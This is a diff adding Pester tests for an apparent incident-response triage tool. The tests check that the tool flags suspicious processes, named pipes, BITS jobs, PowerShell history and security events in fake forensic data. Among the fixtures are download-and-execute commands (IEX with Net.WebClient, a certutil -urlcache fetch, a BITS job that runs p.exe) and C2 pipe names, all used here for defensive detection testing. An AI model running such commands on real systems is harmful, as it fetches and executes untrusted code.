@@ -208,3 +208,92 @@ Describe 'Script block and log coverage leads' {
         $cov.Detail | Should -Match 'full \(15 of 15 MB'
     }
 }
+
+Describe 'Processes, pipes, BITS, PowerShell history and 4688' {
+    BeforeAll {
+        $d = Get-SuspectData
+        $d.processes = @(
+            [pscustomobject]@{ ProcessId = 4; ParentProcessId = 0; ParentName = $null; Name = 'System' },
+            [pscustomobject]@{ ProcessId = 700; ParentProcessId = 4; ParentName = 'System'; Name = 'smss.exe' },
+            [pscustomobject]@{ ProcessId = 3000; ParentProcessId = 2000; ParentName = 'explorer.exe'; Name = 'winword.exe' },
+            [pscustomobject]@{ ProcessId = 4242; ParentProcessId = 3000; ParentName = 'winword.exe'; Name = 'powershell.exe'; CommandLine = 'powershell.exe -c whoami' },
+            [pscustomobject]@{ ProcessId = 9999; ParentProcessId = 8888; ParentName = $null; Name = 'orphan.exe' }
+        )
+        $d.named_pipes = @(
+            [pscustomobject]@{ PipeName = 'msagent_4f' }, [pscustomobject]@{ PipeName = 'PSEXESVC' },
+            [pscustomobject]@{ PipeName = 'mojo.1234.5678.123456789' }, [pscustomobject]@{ PipeName = 'lsass' }
+        )
+        $d.bits_jobs = @(
+            [pscustomobject]@{ DisplayName = 'Updater'; Owner = 'CORP\jdoe'; JobState = 'Transferred'; RemoteNames = 'http://203.0.113.50/p.exe'; LocalNames = 'C:\Users\Public\p.exe'; NotifyCmdLine = 'C:\Users\Public\p.exe' },
+            [pscustomobject]@{ DisplayName = 'Grabber'; Owner = 'CORP\jdoe'; JobState = 'Transferred'; RemoteNames = 'https://files.example.net/x.zip'; LocalNames = 'C:\Temp\x.zip'; NotifyCmdLine = $null },
+            [pscustomobject]@{ DisplayName = 'WU'; Owner = 'NT AUTHORITY\SYSTEM'; JobState = 'Transferred'; RemoteNames = 'http://dl.delivery.mp.microsoft.com/a.cab'; LocalNames = 'C:\Windows\a.cab'; NotifyCmdLine = $null }
+        )
+        $d.powershell_history = @(
+            [pscustomobject]@{ User = 'jdoe'; File = 'ConsoleHost_history.txt'; LineNumber = 1; Command = 'Get-ChildItem' },
+            [pscustomobject]@{ User = 'jdoe'; File = 'ConsoleHost_history.txt'; LineNumber = 2; Command = 'IEX (New-Object Net.WebClient).DownloadString("http://x/a")' },
+            [pscustomobject]@{ User = 'jdoe'; File = 'ConsoleHost_history.txt'; LineNumber = 3; Command = 'IEX (New-Object Net.WebClient).DownloadString("http://x/a")' }
+        )
+        $evt = { param($id, $data) [pscustomobject]@{ TimeCreated = '2026-01-01T00:00:00Z'; LogName = 'Security'; EventId = $id; Data = [pscustomobject]$data } }
+        $d.events_process_creation = @(
+            (& $evt 4688 @{ CommandLine = 'certutil.exe -urlcache -f http://x/a a.exe'; SubjectDomainName = 'CORP'; SubjectUserName = 'jdoe'; ParentProcessName = 'C:\Windows\System32\cmd.exe' }),
+            (& $evt 4688 @{ CommandLine = 'certutil.exe -urlcache -f http://x/a a.exe'; SubjectDomainName = 'CORP'; SubjectUserName = 'jdoe'; ParentProcessName = 'C:\Windows\System32\cmd.exe' }),
+            (& $evt 4688 @{ CommandLine = 'notepad.exe'; SubjectDomainName = 'CORP'; SubjectUserName = 'jdoe' })
+        )
+        $d.events_security = @(
+            (& $evt 4698 @{ TaskName = '\EvilTask'; SubjectDomainName = 'CORP'; SubjectUserName = 'jdoe' }),
+            (& $evt 4702 @{ TaskName = '\Microsoft\Windows\UpdateOrchestrator\Schedule Scan'; SubjectDomainName = 'NT AUTHORITY'; SubjectUserName = 'SYSTEM' }),
+            (& $evt 4719 @{ SubjectDomainName = 'CORP'; SubjectUserName = 'jdoe'; SubcategoryGuid = '{0CCE922B-69AE-11D9-BED3-505054503030}'; AuditPolicyChanges = '%%8448' })
+        )
+        $p = New-FakeTriage -Path (Join-Path $root 'extended') -Data $d -ComputerName 'WS-0200'
+        $t = Import-IRTriage -Path $p
+        $leads = @(Get-IRTriageLeads -Triage $t)
+        $o = Join-Path $root 'extended.html'
+        $null = & (Join-Path $analyst 'ConvertTo-TriageReport.ps1') -Path $p -OutFile $o 6>$null
+        $html = [System.IO.File]::ReadAllText($o)
+    }
+
+    It 'orders processes as a tree with orphans as roots' {
+        $rows = @(Get-IRProcessTreeRows @($t.Data['processes']))
+        ($rows | ForEach-Object { [int]$_.ProcessId }) -join ',' | Should -Be '4,700,3000,4242,9999'
+        ($rows | Where-Object ProcessId -eq 700).TreeName | Should -Be '\_ smss.exe'
+        ($rows | Where-Object ProcessId -eq 4242).TreeName | Should -Be '\_ powershell.exe'
+    }
+    It 'has a Processes section with PIDs' {
+        $html | Should -Match '<section id="processes">'
+        $html | Should -Match '<table data-resizable id="proc-table">'
+        $html | Should -Match '<td class="num">4242</td>'
+    }
+    It 'shows PowerShell history under Users and sessions' {
+        $html | Should -Match 'id="pshist-table"'
+        $html | Should -Match 'Net\.WebClient'
+    }
+    It 'raises C2 pipe names as high and PsExec as review, ignoring benign pipes' {
+        ($leads | Where-Object Title -eq 'Named pipe msagent_4f').Severity | Should -Be 'high'
+        ($leads | Where-Object Title -eq 'Named pipe PSEXESVC').Severity | Should -Be 'review'
+        @($leads | Where-Object Collector -eq 'named_pipes').Count | Should -Be 2
+    }
+    It 'grades BITS jobs: notify command high, foreign download review, Microsoft ignored' {
+        ($leads | Where-Object Title -like "BITS job 'Updater'*").Severity | Should -Be 'high'
+        ($leads | Where-Object Title -like "BITS job 'Grabber'*").Severity | Should -Be 'review'
+        $leads | Where-Object Title -like "BITS job 'WU'*" | Should -BeNullOrEmpty
+    }
+    It 'raises one lead per distinct suspicious history command' {
+        @($leads | Where-Object Collector -eq 'powershell_history').Count | Should -Be 1
+        ($leads | Where-Object Collector -eq 'powershell_history').Severity | Should -Be 'high'
+    }
+    It 'groups suspicious 4688 command lines' {
+        $l = @($leads | Where-Object Collector -eq 'events_process_creation')
+        $l.Count | Should -Be 1
+        $l[0].Detail | Should -Match 'x2'
+    }
+    It 'reports non-Microsoft task creation and audit policy changes, not Microsoft task updates' {
+        $leads | Where-Object Title -eq 'Scheduled task created: \EvilTask' | Should -Not -BeNullOrEmpty
+        $leads | Where-Object Title -like 'System audit policy changed*' | Should -Not -BeNullOrEmpty
+        $leads | Where-Object Title -like 'Scheduled task updated*' | Should -BeNullOrEmpty
+    }
+    It 'diffs BITS jobs against a baseline' {
+        $bp = New-FakeTriage -Path (Join-Path $root 'bits-base') -Data (@{ bits_jobs = @($d.bits_jobs[2]) })
+        $diff = @(& (Join-Path $analyst 'Compare-Triage.ps1') -Baseline $bp -Suspect $p -Category bits_jobs)
+        @($diff | Where-Object Change -eq 'Added').Count | Should -Be 2
+    }
+}
